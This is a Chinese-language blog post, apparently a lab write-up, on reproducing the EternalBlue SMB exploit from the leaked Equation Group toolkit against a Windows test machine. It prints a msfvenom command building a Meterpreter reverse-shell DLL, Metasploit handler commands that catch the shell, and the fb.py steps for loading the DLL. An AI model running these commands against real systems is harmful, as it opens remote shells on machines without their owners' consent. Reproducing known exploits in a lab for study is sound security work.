<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 方程式 0day Eternalblue复现 · Uknow’s Blog</title><meta name="description" content="方程式 0day Eternalblue复现 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="http://weibo.com/u/3477219002" target="_blank" class="nav-list-link">Weibo</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">Rss</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">方程式 0day Eternalblue复现</h1><div class="post-time">May 26, 2017</div><div class="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天去学长公司了，在公司呆了一下午。其间学长的同事让我复现下方程式Eternalblue，但是由于我没有带电脑所以没有在那边进行复现。Eternalblue之前我是有复现过的，那时候是用吐司上别人发的MSF集成的脚本。但是好像是成功了，回来打开KALI还看到之前的成功记录。这次再次进行一次复现，在这个过程中，一开始我是按照学长同事给的freebuf上的一篇文章来的，但是我最初下载的Empire是最新版的，然后在配置listeners的过程中出现错误，不能配置。无奈在他人的提醒下下载了1.6版本但是由于之前安装了最新版的问题，1.6无法安装。所以只能直接用msf进行监听了。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击机 ： 10.15.17.215</span><br><span class="line">win7 32bit 旗舰版</span><br><span class="line">python-2.6.6.msi</span><br><span class="line">https://www.python.org/download/releases/2.6.6/</span><br><span class="line">pywin32-221.win32-py2.6.exe</span><br><span class="line">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg" alt=""></p>
<h3 id="监听机"><a href="#监听机" class="headerlink" title="监听机"></a>监听机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">监听机 ： 10.15.198.65</span><br><span class="line">KALI</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101141.jpg" alt=""></p>
<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机 ： 10.15.251.226</span><br><span class="line">win 64bit en 旗舰版</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526100922.jpg" alt=""></p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h3><ul>
<li><p>在KALI下生成s.dll到apache目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.15.198.65 LPORT=5555 -f dll &gt; /var/www/html/s.dll</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动apache服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101041.jpg" alt=""></p>
<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/mulit/handler</span><br><span class="line">set LHOST 10.15.198.65</span><br><span class="line">set LPORT 5555</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""></p>
<h3 id="配置攻击脚本"><a href="#配置攻击脚本" class="headerlink" title="配置攻击脚本"></a>配置攻击脚本</h3><ul>
<li>运行fb.py 配置攻击脚本</li>
<li>访问KALI的web服务器下载s.dll文件复制到C盘目录</li>
<li>加载DLL</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101230.jpg" alt=""></p>
<h3 id="操作监听机"><a href="#操作监听机" class="headerlink" title="操作监听机"></a>操作监听机</h3><ul>
<li>Msf里成功收到一个shell</li>
<li>getuid</li>
<li>ipconfig</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101109.jpg" alt=""></p>
<h2 id="之前的复现图"><a href="#之前的复现图" class="headerlink" title="之前的复现图"></a>之前的复现图</h2><p>附上之前利用msf集成exp脚本测试图。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/_ZC1FX3$WP%5DCML2JTF8MMTT.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/~X%7D5U%7D5VQO@OPK%5BN$5~_Y%5DG.png" alt=""></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>昨天回来后休息了一会，然后才开始复现的，等我把环境配置好的时候已经断网了。Empire最新版无法配置listeners的问题一直没有解决。早上下载1.6版本有出现了错误，需要删除最新版。但是Empire是利用.sh安装的，想要卸载干净不是那么简单的。再加上我的KALI没有快照不能还原，无奈只能直接利用MSF，不能按照freebuf上的文章进行复现。然后自己的电脑也比较渣，开三个虚拟机一卡一卡的，陆陆续续才完成这个复现过程。</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/理解php序列化漏洞.html" class="prev">PREV</a><a href="/posts/notes/python编程实践学习-模拟登录爬取信息.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="http://uknowsec.cn">uknow</a>, Powered by Hexo & Hexo-theme-apollo.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>